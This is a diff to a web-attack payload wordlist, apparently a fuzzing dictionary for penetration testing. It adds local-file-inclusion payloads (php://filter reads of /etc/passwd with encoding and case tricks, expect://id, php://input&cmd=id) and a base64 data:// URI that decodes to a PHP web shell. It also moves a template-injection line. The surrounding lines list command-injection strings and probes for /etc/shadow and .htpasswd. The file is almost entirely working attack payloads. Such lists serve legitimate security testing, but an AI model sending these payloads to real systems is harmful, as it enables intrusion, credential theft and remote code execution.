@@ -1,6 +1,5 @@
 ";id;"
 "|/usr/bin/id|"
-{{['id']|map('system')|join}}
 "|id|"
 "||/usr/bin/id|"
 $(`cat /etc/passwd`)
@@ -4127,6 +4126,7 @@ config.php
 d:\AppServ\MySQL
 d:\System32\Inetsrv\metabase.xml
 data.php
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4%3D%0A
 database.asp
 database.js
 database.php
@@ -4142,16 +4142,28 @@ etc%c0%afpasswd
 etc%c0%afpasswd%00
 etc/passwd
 etc/passwd%00
+etc/passwd%2500
 etc/shadow%00
+expect://id
 install.php
 member/.htpasswd
 members/.htpasswd
 netstat
 netstat -a
+pHp://FilTer/convert.base64-encode/resource=/etc/passwd
+pHp://FilTer/convert.base64-encode/resource=/etc/passwd%00
 pass.dat
 passwd
 passwd.dat
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=/etc/passwd%00
+php://filter/read=string.rot13/resource=/etc/passwd
+php://filter/read=string.rot13/resource=/etc/passwd%00
+php://filter/resource=/etc/passwd
+php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
 php://input
+php://input&cmd=id
+php:expect://id%00
 root/.htpasswd
 system('cat /etc/passwd');
 user/.htpasswd
@@ -4161,6 +4173,7 @@ web.config
 wp-admin.php
 wp-login.php
 {{ get_user_file("/etc/passwd") }}
+{{['id']|map('system')|join}}
 | dir C:\
 | dir C:\*
 | id
